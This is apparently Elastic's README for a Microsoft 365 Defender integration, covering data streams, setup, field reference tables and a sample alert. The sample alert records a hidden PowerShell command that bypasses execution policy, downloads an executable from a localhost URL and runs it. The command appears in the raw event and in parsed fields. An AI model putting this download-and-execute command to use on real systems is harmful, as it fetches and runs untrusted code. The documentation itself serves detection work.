# M365 Defender integration

## Overview

The [Microsoft 365 Defender](https://learn.microsoft.com/en-us/microsoft-365/security/defender) integration allows you to monitor Alert, Incident (Microsoft Graph Security API) and Event (Streaming API) Logs. Microsoft 365 Defender is a unified pre and post-breach enterprise defense suite that natively coordinates detection, prevention, investigation, and response across endpoints, identities, email, and applications to provide integrated protection against sophisticated attacks.

Use the Microsoft 365 Defender integration to collect and parse data from the Microsoft Azure Event Hub, Microsoft Graph Security v1.0 REST API and Microsoft 365 Defender API. Then visualise that data in Kibana.

For example, you could use the data from this integration to consolidate and correlate security alerts from multiple sources. Also, by looking into the alert and incident, a user can take an appropriate action in the Microsoft 365 Defender Portal.

## Data streams

The Microsoft 365 Defender integration collects logs for four types of events: Alert, Event, Incident and Log.

**Alert:** This data streams leverages the [M365 Defender Streaming API](https://learn.microsoft.com/en-us/graph/api/resources/security-alert?view=graph-rest-1.0) to collect alerts including suspicious activities in a customer's tenant that Microsoft or partner security providers have identified and flagged for action.

**Event (Recommended):** This data streams leverages the [M365 Defender Streaming API](https://learn.microsoft.com/en-us/microsoft-365/security/defender/streaming-api?view=o365-worldwide) to collect Alert, Device, Email, App and Identity Events. Events are streamed to an Azure Event Hub. For a list of Supported Events exposed by the Streaming API and supported by Elastic's integration, please see Microsoft's documentation [here](https://learn.microsoft.com/en-us/microsoft-365/security/defender/supported-event-types?view=o365-worldwide).

**Incidents and Alerts (Recommended):** This data streams leverages the [Microsoft Graph Security API](https://learn.microsoft.com/en-us/graph/api/resources/security-api-overview?view=graph-rest-1.0) to ingest a collection of correlated alert instances and associated metadata that reflects the story of an attack in M365D. Incidents stemming from Microsoft 365 Defender, Microsoft Defender for Endpoint, Microsoft Defender for Office 365, Microsoft Defender for Identity, Microsoft Defender for Cloud Apps, and Microsoft Purview Data Loss Prevention are supported by this integration.

**Log (Deprecated):** This data stream is not recommend as it collects incidents from the SIEM API that Microsoft plans to deprecate. The data stream will be removed when Microsoft has deprecated the SIEM API. If you are currently using this data stream, we recommend moving to the Incident data stream which supports Microsoft's Graph Security API. The incidents data stream collects the same data as the log data stream. Please see Microsoft's [documentation](https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/configure-siem?view=o365-worldwide) on migration from SIEM API to Graph Security API for more information.

## Requirements

You need Elasticsearch for storing and searching your data and Kibana for visualizing and managing it. You can use our hosted Elasticsearch Service on Elastic Cloud, which is recommended, or self-manage the Elastic Stack on your own hardware.

This module has used **Microsoft Azure Event Hub** for Streaming Event, **Microsoft Graph Security v1.0 REST API** for Incident and **Microsoft 365 Defender API** for Log data streams.

For **Event**, in filebeat [Azure Event Hub](https://www.elastic.co/guide/en/beats/filebeat/current/filebeat-input-azure-eventhub.html) input, state such as leases on partitions and checkpoints in the event stream are shared between receivers using an Azure Storage container. For this reason, as a prerequisite to using this input, users will have to create or use an existing storage account.

## Compatibility

- Supported Microsoft 365 Defender streaming event types have been supported in the current integration version:

  | Sr. No. | Resource types            |
  |---------|---------------------------|
  |    1    | AlertEvidence             |
  |    2    | AlertInfo                 |
  |    3    | DeviceEvents              |
  |    4    | DeviceFileCertificateInfo |
  |    5    | DeviceFileEvents          |
  |    6    | DeviceImageLoadEvents     |
  |    7    | DeviceInfo                |
  |    8    | DeviceLogonEvents         |
  |    9    | DeviceNetworkEvents       |
  |   10    | DeviceNetworkInfo         |
  |   11    | DeviceProcessEvents       |
  |   12    | DeviceRegistryEvents      |
  |   13    | EmailAttachmentInfo       |
  |   14    | EmailEvents               |
  |   15    | EmailPostDeliveryEvents   |
  |   16    | EmailUrlInfo              |
  |   17    | IdentityLogonEvents       |
  |   18    | IdentityQueryEvents       |
  |   19    | IdentityDirectoryEvents   |
  |   20    | CloudAppEvents            |
  |   21    | UrlClickEvent             |

## Setup

### To collect data from Microsoft Azure Event Hub, follow the below steps:
1. [Configure Microsoft 365 Defender to stream Advanced Hunting events to your Azure Event Hub](https://learn.microsoft.com/en-us/microsoft-365/security/defender/streaming-api-event-hub?view=o365-worldwide).

### To collect data from Microsoft Graph Security v1.0 REST API, follow the below steps:

1. [Register a new Azure Application](https://learn.microsoft.com/en-us/graph/auth-register-app-v2?view=graph-rest-1.0).
2. Permission required for accessing Incident API would be **SecurityIncident.Read.All**. See more details [here](https://learn.microsoft.com/en-us/graph/auth-v2-service?view=graph-rest-1.0)
3. After the application has been created, it will generate Client ID, Client Secret and Tenant ID values that are required for alert and incident data collection.

### To collect data from Microsoft 365 Defender REST API, follow the below steps:

1. [Register a new Azure Application](https://learn.microsoft.com/en-us/microsoft-365/security/defender/api-create-app-web?view=o365-worldwide#create-an-app).
2. Permission required for accessing Log API would be **Incident.Read.All**.
3. After the application has been created, it will generate Client ID, Client Secret and Tenant ID values that are required for log data collection.

## Logs reference

### alert

This is the `alert` dataset.

#### Example

An example event for `alert` looks as following:

```json
{
    "@timestamp": "2023-10-20T09:54:07.503Z",
    "agent": {
        "ephemeral_id": "3e24a8f6-11a3-415f-b6d6-c5188d9239f6",
        "id": "26c7b361-0790-47aa-b465-a57c5d8ab6b8",
        "name": "docker-fleet-agent",
        "type": "filebeat",
        "version": "8.7.1"
    },
    "cloud": {
        "account": {
            "id": "3adb963c-8e61-48e8-a06d-6dbb0dacea39"
        }
    },
    "data_stream": {
        "dataset": "m365_defender.alert",
        "namespace": "ep",
        "type": "logs"
    },
    "ecs": {
        "version": "8.11.0"
    },
    "elastic_agent": {
        "id": "26c7b361-0790-47aa-b465-a57c5d8ab6b8",
        "snapshot": false,
        "version": "8.7.1"
    },
    "event": {
        "action": [
            "detected"
        ],
        "agent_id_status": "verified",
        "category": [
            "host",
            "iam",
            "network",
            "process"
        ],
        "created": "2023-10-20T09:53:09.883Z",
        "dataset": "m365_defender.alert",
        "duration": 2478000000,
        "end": "2023-10-20T09:51:41.993Z",
        "id": "daefa1828b-dd4e-405c-8a3b-aa28596830dd_1",
        "ingested": "2024-01-29T06:22:16Z",
        "kind": "alert",
        "original": "{\"actorDisplayName\":null,\"additionalData\":null,\"alertPolicyId\":null,\"alertWebUrl\":\"https://security.microsoft.com/alerts/daefa1828b-dd4e-405c-8a3b-aa28596830dd_1?tid=3adb963c-8e61-48e8-a06d-6dbb0dacea39\",\"assignedTo\":null,\"category\":\"Execution\",\"classification\":null,\"comments\":[],\"createdDateTime\":\"2023-10-20T09:53:09.8839373Z\",\"description\":\"A suspicious PowerShell activity was observed on the machine. \\nThis behavior may indicate that PowerShell was used during installation, exploration, or in some cases in lateral movement activities which are used by attackers to invoke modules, download external payloads, or get more information about the system. Attackers usually use PowerShell to bypass security protection mechanisms by executing their payload in memory without touching the disk and leaving any trace.\",\"detectionSource\":\"microsoftDefenderForEndpoint\",\"detectorId\":\"7f1c3609-a3ff-40e2-995b-c01770161d68\",\"determination\":null,\"evidence\":[{\"@odata.type\":\"#microsoft.graph.security.deviceEvidence\",\"azureAdDeviceId\":\"f18bd540-d5e4-46e0-8ddd-3d03a59e4e14\",\"createdDateTime\":\"2023-10-20T09:53:10.1933333Z\",\"defenderAvStatus\":\"notSupported\",\"detailedRoles\":[\"PrimaryDevice\"],\"deviceDnsName\":\"clw555test\",\"firstSeenDateTime\":\"2023-10-20T09:50:17.7383987Z\",\"healthStatus\":\"inactive\",\"ipInterfaces\":[\"192.168.5.65\",\"fe80::cfe4:80b:615c:38fb\",\"127.0.0.1\",\"::1\"],\"loggedOnUsers\":[{\"accountName\":\"CDPUserIS-38411\",\"domainName\":\"AzureAD\"}],\"mdeDeviceId\":\"505d70d89cfa3428f7aac7d2eb3a64c60fd3d843\",\"onboardingStatus\":\"onboarded\",\"osBuild\":22621,\"osPlatform\":\"Windows11\",\"rbacGroupId\":0,\"rbacGroupName\":null,\"remediationStatus\":\"none\",\"remediationStatusDetails\":null,\"riskScore\":\"high\",\"roles\":[],\"tags\":[],\"verdict\":\"unknown\",\"version\":\"22H2\",\"vmMetadata\":null},{\"@odata.type\":\"#microsoft.graph.security.userEvidence\",\"createdDateTime\":\"2023-10-20T09:53:10.1933333Z\",\"detailedRoles\":[],\"remediationStatus\":\"none\",\"remediationStatusDetails\":null,\"roles\":[],\"tags\":[],\"userAccount\":{\"accountName\":\"CDPUserIS-38411\",\"azureAdUserId\":null,\"displayName\":null,\"domainName\":\"AzureAD\",\"userPrincipalName\":null,\"userSid\":\"S-1-12-1-1485667349-1150190949-4065799612-2328216759\"},\"verdict\":\"unknown\"},{\"@odata.type\":\"#microsoft.graph.security.urlEvidence\",\"createdDateTime\":\"2023-10-20T09:53:10.1933333Z\",\"detailedRoles\":[],\"remediationStatus\":\"none\",\"remediationStatusDetails\":null,\"roles\":[],\"tags\":[],\"url\":\"http://127.0.0.1/1.exe\",\"verdict\":\"suspicious\"},{\"@odata.type\":\"#microsoft.graph.security.ipEvidence\",\"countryLetterCode\":null,\"createdDateTime\":\"2023-10-20T09:53:10.1933333Z\",\"detailedRoles\":[],\"ipAddress\":\"127.0.0.1\",\"remediationStatus\":\"none\",\"remediationStatusDetails\":null,\"roles\":[],\"tags\":[],\"verdict\":\"suspicious\"},{\"@odata.type\":\"#microsoft.graph.security.processEvidence\",\"createdDateTime\":\"2023-10-20T09:53:10.1933333Z\",\"detailedRoles\":[],\"detectionStatus\":\"detected\",\"imageFile\":{\"fileName\":\"powershell.exe\",\"filePath\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\",\"filePublisher\":\"Microsoft Corporation\",\"fileSize\":491520,\"issuer\":null,\"sha1\":\"a72c41316307889e43fe8605a0dca4a72e72a011\",\"sha256\":\"d783ba6567faf10fdff2d0ea3864f6756862d6c733c7f4467283da81aedc3a80\",\"signer\":null},\"mdeDeviceId\":\"505d70d89cfa3428f7aac7d2eb3a64c60fd3d843\",\"parentProcessCreationDateTime\":\"2023-10-20T09:51:19.5064237Z\",\"parentProcessId\":5772,\"parentProcessImageFile\":{\"fileName\":\"cmd.exe\",\"filePath\":\"C:\\\\Windows\\\\System32\",\"filePublisher\":\"Microsoft Corporation\",\"fileSize\":323584,\"issuer\":null,\"sha1\":null,\"sha256\":null,\"signer\":null},\"processCommandLine\":\"powershell.exe  -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference= 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\\\\\\\test-WDATP-test\\\\\\\\invoice.exe');Start-Process 'C:\\\\\\\\test-WDATP-test\\\\\\\\invoice.exe'\",\"processCreationDateTime\":\"2023-10-20T09:51:39.4997961Z\",\"processId\":8224,\"remediationStatus\":\"none\",\"remediationStatusDetails\":null,\"roles\":[],\"tags\":[],\"userAccount\":{\"accountName\":\"CDPUserIS-38411\",\"azureAdUserId\":null,\"displayName\":null,\"domainName\":\"AzureAD\",\"userPrincipalName\":null,\"userSid\":\"S-1-12-1-1485667349-1150190949-4065799612-2328216759\"},\"verdict\":\"unknown\"}],\"firstActivityDateTime\":\"2023-10-20T09:51:39.5154802Z\",\"id\":\"daefa1828b-dd4e-405c-8a3b-aa28596830dd_1\",\"incidentId\":\"23\",\"incidentWebUrl\":\"https://security.microsoft.com/incidents/23?tid=3adb963c-8e61-48e8-a06d-6dbb0dacea39\",\"lastActivityDateTime\":\"2023-10-20T09:51:41.9939003Z\",\"lastUpdateDateTime\":\"2023-10-20T09:54:07.5033333Z\",\"mitreTechniques\":[\"T1059.001\"],\"productName\":\"Microsoft Defender for Endpoint\",\"providerAlertId\":\"efa1828b-dd4e-405c-8a3b-aa28596830dd_1\",\"recommendedActions\":\"1. Examine the PowerShell command line to understand what commands were executed. Note: the content may need to be decoded if it is Base64-encoded.\\n2. Search the script for more indicators to investigate - for example IP addresses (potential C\\u0026C servers), target computers etc.\\n3. Explore the timeline of this and other related machines for additional suspect activities around the time of the alert.\\n4. Look for the process that invoked this PowerShell run and their origin. Consider submitting any suspect files in the chain for deep analysis for detailed behavior information.\",\"resolvedDateTime\":null,\"serviceSource\":\"microsoftDefenderForEndpoint\",\"severity\":\"medium\",\"status\":\"new\",\"tenantId\":\"3adb963c-8e61-48e8-a06d-6dbb0dacea39\",\"threatDisplayName\":null,\"threatFamilyName\":null,\"title\":\"Suspicious PowerShell command line\"}",
        "provider": "microsoftDefenderForEndpoint",
        "severity": 3,
        "start": "2023-10-20T09:51:39.515Z",
        "type": [
            "info"
        ],
        "url": "https://security.microsoft.com/alerts/daefa1828b-dd4e-405c-8a3b-aa28596830dd_1?tid=3adb963c-8e61-48e8-a06d-6dbb0dacea39"
    },
    "host": {
        "id": [
            "505d70d89cfa3428f7aac7d2eb3a64c60fd3d843"
        ],
        "ip": [
            "127.0.0.1"
        ],
        "os": {
            "name": [
                "Windows11"
            ],
            "version": [
                "22H2"
            ]
        }
    },
    "input": {
        "type": "httpjson"
    },
    "m365_defender": {
        "alert": {
            "category": "Execution",
            "created_datetime": "2023-10-20T09:53:09.883Z",
            "description": "A suspicious PowerShell activity was observed on the machine. \nThis behavior may indicate that PowerShell was used during installation, exploration, or in some cases in lateral movement activities which are used by attackers to invoke modules, download external payloads, or get more information about the system. Attackers usually use PowerShell to bypass security protection mechanisms by executing their payload in memory without touching the disk and leaving any trace.",
            "detection_source": "microsoftDefenderForEndpoint",
            "detector_id": "7f1c3609-a3ff-40e2-995b-c01770161d68",
            "evidence": [
                {
                    "azure_ad_device_id": "f18bd540-d5e4-46e0-8ddd-3d03a59e4e14",
                    "created_datetime": "2023-10-20T09:53:10.193Z",
                    "defender_av_status": "notSupported",
                    "detailed_roles": [
                        "PrimaryDevice"
                    ],
                    "device_dns_name": "clw555test",
                    "first_seen_datetime": "2023-10-20T09:50:17.738Z",
                    "health_status": "inactive",
                    "ip_interfaces": [
                        "192.168.5.65",
                        "fe80::cfe4:80b:615c:38fb",
                        "127.0.0.1",
                        "::1"
                    ],
                    "logged_on_users": [
                        {
                            "account_name": "CDPUserIS-38411",
                            "domain_name": "AzureAD"
                        }
                    ],
                    "mde_device_id": "505d70d89cfa3428f7aac7d2eb3a64c60fd3d843",
                    "odata_type": "#microsoft.graph.security.deviceEvidence",
                    "onboarding_status": "onboarded",
                    "os_build": "22621",
                    "os_platform": "Windows11",
                    "rbac_group": {
                        "id": "0"
                    },
                    "remediation_status": "none",
                    "risk_score": "high",
                    "verdict": "unknown",
                    "version": "22H2"
                },
                {
                    "created_datetime": "2023-10-20T09:53:10.193Z",
                    "odata_type": "#microsoft.graph.security.userEvidence",
                    "remediation_status": "none",
                    "user_account": {
                        "account_name": "CDPUserIS-38411",
                        "domain_name": "AzureAD",
                        "user_sid": "S-1-12-1-1485667349-1150190949-4065799612-2328216759"
                    },
                    "verdict": "unknown"
                },
                {
                    "created_datetime": "2023-10-20T09:53:10.193Z",
                    "odata_type": "#microsoft.graph.security.urlEvidence",
                    "remediation_status": "none",
                    "url": "http://127.0.0.1/1.exe",
                    "verdict": "suspicious"
                },
                {
                    "created_datetime": "2023-10-20T09:53:10.193Z",
                    "ip_address": "127.0.0.1",
                    "odata_type": "#microsoft.graph.security.ipEvidence",
                    "remediation_status": "none",
                    "verdict": "suspicious"
                },
                {
                    "created_datetime": "2023-10-20T09:53:10.193Z",
                    "detection_status": "detected",
                    "image_file": {
                        "name": "powershell.exe",
                        "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0",
                        "publisher": "Microsoft Corporation",
                        "sha1": "a72c41316307889e43fe8605a0dca4a72e72a011",
                        "sha256": "d783ba6567faf10fdff2d0ea3864f6756862d6c733c7f4467283da81aedc3a80",
                        "size": 491520
                    },
                    "mde_device_id": "505d70d89cfa3428f7aac7d2eb3a64c60fd3d843",
                    "odata_type": "#microsoft.graph.security.processEvidence",
                    "parent_process": {
                        "creation_datetime": "2023-10-20T09:51:19.506Z",
                        "id": 5772,
                        "image_file": {
                            "name": "cmd.exe",
                            "path": "C:\\Windows\\System32",
                            "publisher": "Microsoft Corporation",
                            "size": 323584
                        }
                    },
                    "process": {
                        "command_line": "powershell.exe  -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference= 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\\\test-WDATP-test\\\\invoice.exe');Start-Process 'C:\\\\test-WDATP-test\\\\invoice.exe'",
                        "creation_datetime": "2023-10-20T09:51:39.499Z",
                        "id": 8224
                    },
                    "remediation_status": "none",
                    "user_account": {
                        "account_name": "CDPUserIS-38411",
                        "domain_name": "AzureAD",
                        "user_sid": "S-1-12-1-1485667349-1150190949-4065799612-2328216759"
                    },
                    "verdict": "unknown"
                }
            ],
            "first_activity_datetime": "2023-10-20T09:51:39.515Z",
            "id": "daefa1828b-dd4e-405c-8a3b-aa28596830dd_1",
            "incident_id": "23",
            "incident_web_url": {
                "domain": "security.microsoft.com",
                "original": "https://security.microsoft.com/incidents/23?tid=3adb963c-8e61-48e8-a06d-6dbb0dacea39",
                "path": "/incidents/23",
                "query": "tid=3adb963c-8e61-48e8-a06d-6dbb0dacea39",
                "scheme": "https"
            },
            "last_activity_datetime": "2023-10-20T09:51:41.993Z",
            "last_update_datetime": "2023-10-20T09:54:07.503Z",
            "mitre_techniques": [
                "T1059.001"
            ],
            "provider_alert_id": "efa1828b-dd4e-405c-8a3b-aa28596830dd_1",
            "recommended_actions": "1. Examine the PowerShell command line to understand what commands were executed. Note: the content may need to be decoded if it is Base64-encoded.\n2. Search the script for more indicators to investigate - for example IP addresses (potential C&C servers), target computers etc.\n3. Explore the timeline of this and other related machines for additional suspect activities around the time of the alert.\n4. Look for the process that invoked this PowerShell run and their origin. Consider submitting any suspect files in the chain for deep analysis for detailed behavior information.",
            "service_source": "microsoftDefenderForEndpoint",
            "severity": "medium",
            "status": "new",
            "tenant_id": "3adb963c-8e61-48e8-a06d-6dbb0dacea39",
            "title": "Suspicious PowerShell command line",
            "web_url": {
                "domain": "security.microsoft.com",
                "original": "https://security.microsoft.com/alerts/daefa1828b-dd4e-405c-8a3b-aa28596830dd_1?tid=3adb963c-8e61-48e8-a06d-6dbb0dacea39",
                "path": "/alerts/daefa1828b-dd4e-405c-8a3b-aa28596830dd_1",
                "query": "tid=3adb963c-8e61-48e8-a06d-6dbb0dacea39",
                "scheme": "https"
            }
        }
    },
    "message": "A suspicious PowerShell activity was observed on the machine. \nThis behavior may indicate that PowerShell was used during installation, exploration, or in some cases in lateral movement activities which are used by attackers to invoke modules, download external payloads, or get more information about the system. Attackers usually use PowerShell to bypass security protection mechanisms by executing their payload in memory without touching the disk and leaving any trace.",
    "process": {
        "command_line": [
            "powershell.exe  -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference= 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\\\test-WDATP-test\\\\invoice.exe');Start-Process 'C:\\\\test-WDATP-test\\\\invoice.exe'"
        ],
        "hash": {
            "sha1": [
                "a72c41316307889e43fe8605a0dca4a72e72a011"
            ],
            "sha256": [
                "d783ba6567faf10fdff2d0ea3864f6756862d6c733c7f4467283da81aedc3a80"
            ]
        },
        "parent": {
            "pid": [
                5772
            ],
            "start": [
                "2023-10-20T09:51:19.506Z"
            ]
        },
        "pid": [
            8224
        ],
        "start": [
            "2023-10-20T09:51:39.499Z"
        ],
        "user": {
            "name": [
                "CDPUserIS-38411"
            ]
        }
    },
    "related": {
        "hash": [
            "a72c41316307889e43fe8605a0dca4a72e72a011",
            "d783ba6567faf10fdff2d0ea3864f6756862d6c733c7f4467283da81aedc3a80"
        ],
        "hosts": [
            "505d70d89cfa3428f7aac7d2eb3a64c60fd3d843",
            "Windows11",
            "22H2",
            "clw555test",
            "AzureAD"
        ],
        "ip": [
            "127.0.0.1"
        ],
        "user": [
            "CDPUserIS-38411",
            "S-1-12-1-1485667349-1150190949-4065799612-2328216759"
        ]
    },
    "tags": [
        "preserve_original_event",
        "preserve_duplicate_custom_fields",
        "forwarded",
        "m365_defender-alert"
    ],
    "threat": {
        "tactic": {
            "name": [
                "Execution"
            ]
        },
        "technique": {
            "subtechnique": {
                "id": [
                    "T1059.001"
                ]
            }
        }
    },
    "user": {
        "domain": [
            "AzureAD"
        ],
        "name": [
            "CDPUserIS-38411"
        ]
    }
}
```

**Exported fields**

| Field | Description | Type |
|---|---|---|
| @timestamp | Event timestamp. | date |
| data_stream.dataset | Data stream dataset. | constant_keyword |
| data_stream.namespace | Data stream namespace. | constant_keyword |
| data_stream.type | Data stream type. | constant_keyword |
| event.dataset | Event dataset. | constant_keyword |
| event.module | Event module. | constant_keyword |
| input.type | Type of filebeat input. | keyword |
| log.offset | Log offset. | long |
| m365_defender.alert.actor_display_name | The adversary or activity group that is associated with this alert. | keyword |
| m365_defender.alert.assigned_to | Owner of the alert, or null if no owner is assigned. | keyword |
| m365_defender.alert.category | The attack kill-chain category that the alert belongs to. Aligned with the MITRE ATT&CK framework. | keyword |
| m365_defender.alert.classification | Specifies whether the alert represents a true threat. Possible values are: unknown, falsePositive, truePositive, benignPositive, unknownFutureValue. | keyword |
| m365_defender.alert.comments | Array of comments created by the Security Operations (SecOps) team during the alert management process. | flattened |
| m365_defender.alert.created_datetime | Time when Microsoft 365 Defender created the alert. | date |
| m365_defender.alert.description | String value describing each alert. | keyword |
| m365_defender.alert.detection_source | Detection technology or sensor that identified the notable component or activity. | keyword |
| m365_defender.alert.detector_id | The ID of the detector that triggered the alert. | keyword |
| m365_defender.alert.determination | Specifies the result of the investigation, whether the alert represents a true attack and if so, the nature of the attack. Possible values are: unknown, apt, malware, securityPersonnel, securityTesting, unwantedSoftware, other, multiStagedAttack, compromisedUser, phishing, maliciousUserActivity, clean, insufficientData, confirmedUserActivity, lineOfBusinessApplication, unknownFutureValue. | keyword |
| m365_defender.alert.evidence.antispam_direction | Direction of the email relative to your network. The possible values are: Inbound, Outbound or Intraorg. | keyword |
| m365_defender.alert.evidence.app_id | Unique identifier of the application. | keyword |
| m365_defender.alert.evidence.attachments_count | Number of attachments in the email. | long |
| m365_defender.alert.evidence.azure_ad_device_id | A unique identifier assigned to a device by Azure Active Directory (Azure AD) when device is Azure AD-joined. | keyword |
| m365_defender.alert.evidence.cluster_by | The clustering logic of the emails inside the cluster. | keyword |
| m365_defender.alert.evidence.cluster_by_value | The value utilized to cluster the similar emails. | keyword |
| m365_defender.alert.evidence.created_datetime | The time the evidence was created and added to the alert. | date |
| m365_defender.alert.evidence.defender_av_status | State of the Defender AntiMalware engine. The possible values are: notReporting, disabled, notUpdated, updated, unknown, notSupported, unknownFutureValue. | keyword |
| m365_defender.alert.evidence.delivery_action | Delivery action of the email. The possible values are: Delivered, DeliveredAsSpam, Junked, Blocked, or Replaced. | keyword |
| m365_defender.alert.evidence.delivery_location | Location where the email was delivered. The possible values are: Inbox, External, JunkFolder, Quarantine, Failed, Dropped, DeletedFolder or Forwarded. | keyword |
| m365_defender.alert.evidence.detailed_roles | Detailed roles of the user associated with the event. | keyword |
| m365_defender.alert.evidence.detection_status | The status of the detection.The possible values are: detected, blocked, prevented, unknownFutureValue. | keyword |
| m365_defender.alert.evidence.device_dns_name | The fully qualified domain name (FQDN) for the device. | keyword |
| m365_defender.alert.evidence.display_name | Name of the application. | keyword |
| m365_defender.alert.evidence.email_count | Count of emails in the email cluster. | long |
| m365_defender.alert.evidence.file_details.issuer | The certificate authority (CA) that issued the certificate. | keyword |
| m365_defender.alert.evidence.file_details.name | The name of the file. | keyword |
| m365_defender.alert.evidence.file_details.odata_type |  | keyword |
| m365_defender.alert.evidence.file_details.path | The file path (location) of the file instance. | keyword |
| m365_defender.alert.evidence.file_details.publisher | The publisher of the file. | keyword |
| m365_defender.alert.evidence.file_details.sha1 | The Sha1 cryptographic hash of the file content. | keyword |
| m365_defender.alert.evidence.file_details.sha256 | The Sha256 cryptographic hash of the file content. | keyword |
| m365_defender.alert.evidence.file_details.signer | The signer of the signed file. | keyword |
| m365_defender.alert.evidence.file_details.size | The size of the file in bytes. | long |
| m365_defender.alert.evidence.first_seen_datetime | The date and time when the device was first seen. | date |
| m365_defender.alert.evidence.health_status | The health state of the device.The possible values are: active, inactive, impairedCommunication, noSensorData, noSensorDataImpairedCommunication, unknown, unknownFutureValue. | keyword |
| m365_defender.alert.evidence.image_file.issuer | The certificate authority (CA) that issued the certificate. | keyword |
| m365_defender.alert.evidence.image_file.name | The name of the file. | keyword |
| m365_defender.alert.evidence.image_file.odata_type |  | keyword |
| m365_defender.alert.evidence.image_file.path | The file path (location) of the file instance. | keyword |
| m365_defender.alert.evidence.image_file.publisher | The publisher of the file. | keyword |
| m365_defender.alert.evidence.image_file.sha1 | The Sha1 cryptographic hash of the file content. | keyword |
| m365_defender.alert.evidence.image_file.sha256 | The Sha256 cryptographic hash of the file content. | keyword |
| m365_defender.alert.evidence.image_file.signer | The signer of the signed file. | keyword |
| m365_defender.alert.evidence.image_file.size | The size of the file in bytes. | long |
| m365_defender.alert.evidence.instance_id | Identifier of the instance of the Software as a Service (SaaS) application. | keyword |
| m365_defender.alert.evidence.instance_name | Name of the instance of the SaaS application. | keyword |
| m365_defender.alert.evidence.internet_message_id | Public-facing identifier for the email that is set by the sending email system. | keyword |
| m365_defender.alert.evidence.ip_address | The value of the IP Address, can be either in V4 address or V6 address format. | ip |
| m365_defender.alert.evidence.ip_interfaces | IP Interfaces related to the event. | ip |
| m365_defender.alert.evidence.language | Detected language of the email content. | keyword |
| m365_defender.alert.evidence.logged_on_users.account_name | User account name of the logged-on user. | keyword |
| m365_defender.alert.evidence.logged_on_users.domain_name | User account domain of the logged-on user. | keyword |
| m365_defender.alert.evidence.logged_on_users.odata_type |  | keyword |
| m365_defender.alert.evidence.mde_device_id | A unique identifier assigned to a device by Microsoft Defender for Endpoint. | keyword |
| m365_defender.alert.evidence.network_message_id | Unique identifier for the email, generated by Microsoft 365. | keyword |
| m365_defender.alert.evidence.network_message_ids | Unique identifiers for the emails in the cluster, generated by Microsoft 365. | keyword |
| m365_defender.alert.evidence.object_id | The unique identifier of the application object in Azure AD. | keyword |
| m365_defender.alert.evidence.odata_type |  | keyword |
| m365_defender.alert.evidence.onboarding_status | The status of the machine onboarding to Microsoft Defender for Endpoint.The possible values are: insufficientInfo, onboarded, canBeOnboarded, unsupported, unknownFutureValue. | keyword |
| m365_defender.alert.evidence.os_build | The build version for the operating system the device is running. | keyword |
| m365_defender.alert.evidence.os_platform | The operating system platform the device is running. | keyword |
| m365_defender.alert.evidence.p1_sender.display_name | The name of the sender. | keyword |
| m365_defender.alert.evidence.p1_sender.domain_name | Sender domain. | keyword |
| m365_defender.alert.evidence.p1_sender.email_address | Sender email address. | keyword |
| m365_defender.alert.evidence.p1_sender.odata_type |  | keyword |
| m365_defender.alert.evidence.p2_sender.display_name | The name of the sender. | keyword |
| m365_defender.alert.evidence.p2_sender.domain_name | Sender domain. | keyword |
| m365_defender.alert.evidence.p2_sender.email_address | Sender email address. | keyword |
| m365_defender.alert.evidence.p2_sender.odata_type |  | keyword |
| m365_defender.alert.evidence.parent_process.creation_datetime | Date and time when the parent of the process was created. | date |
| m365_defender.alert.evidence.parent_process.id | Process ID (PID) of the parent process that spawned the process. | long |
| m365_defender.alert.evidence.parent_process.image_file.issuer | The certificate authority (CA) that issued the certificate. | keyword |
| m365_defender.alert.evidence.parent_process.image_file.name | The name of the file. | keyword |
| m365_defender.alert.evidence.parent_process.image_file.odata_type |  | keyword |
| m365_defender.alert.evidence.parent_process.image_file.path | The file path (location) of the file instance. | keyword |
| m365_defender.alert.evidence.parent_process.image_file.publisher | The publisher of the file. | keyword |
| m365_defender.alert.evidence.parent_process.image_file.sha1 | The Sha1 cryptographic hash of the file content. | keyword |
| m365_defender.alert.evidence.parent_process.image_file.sha256 | The Sha256 cryptographic hash of the file content. | keyword |
| m365_defender.alert.evidence.parent_process.image_file.signer | The signer of the signed file. | keyword |
| m365_defender.alert.evidence.parent_process.image_file.size | The size of the file in bytes. | long |
| m365_defender.alert.evidence.primary_address | The primary email address of the mailbox. | keyword |
| m365_defender.alert.evidence.process.command_line | Command line used to create the new process. | keyword |
| m365_defender.alert.evidence.process.creation_datetime | Date and time the process was created. | date |
| m365_defender.alert.evidence.process.id | Process ID (PID) of the newly created process. | long |
| m365_defender.alert.evidence.publisher | The name of the application publisher. | keyword |
| m365_defender.alert.evidence.query | The query used to identify the email cluster. | keyword |
| m365_defender.alert.evidence.rbac_group.id | The ID of the role-based access control (RBAC) device group. | keyword |
| m365_defender.alert.evidence.rbac_group.name | The name of the RBAC device group. | keyword |
| m365_defender.alert.evidence.received_datetime | Date and time when the email was received. | date |
| m365_defender.alert.evidence.recipient_email_address | Email address of the recipient, or email address of the recipient after distribution list expansion. | keyword |
| m365_defender.alert.evidence.registry_hive | Registry hive of the key that the recorded action was applied to. | keyword |
| m365_defender.alert.evidence.registry_key | Registry key that the recorded action was applied to. | keyword |
| m365_defender.alert.evidence.registry_value | Data of the registry value that the recorded action was applied to. | keyword |
| m365_defender.alert.evidence.registry_value_name | Name of the registry value that the recorded action was applied to. | keyword |
| m365_defender.alert.evidence.registry_value_type | Data type, such as binary or string, of the registry value that the recorded action was applied to. | keyword |
| m365_defender.alert.evidence.remediation_status | Status of the remediation action taken. The possible values are: none, remediated, prevented, blocked, notFound, active, pendingApproval, declined, notRemediated, running, unknownFutureValue. | keyword |
| m365_defender.alert.evidence.remediation_status_details | Details about the remediation status. | keyword |
| m365_defender.alert.evidence.risk_score | Risk score as evaluated by Microsoft Defender for Endpoint. The possible values are: none, informational, low, medium, high, unknownFutureValue. | keyword |
| m365_defender.alert.evidence.roles | The role/s that an evidence entity represents in an alert, e.g., an IP address that is associated with an attacker will have the evidence role "Attacker". | keyword |
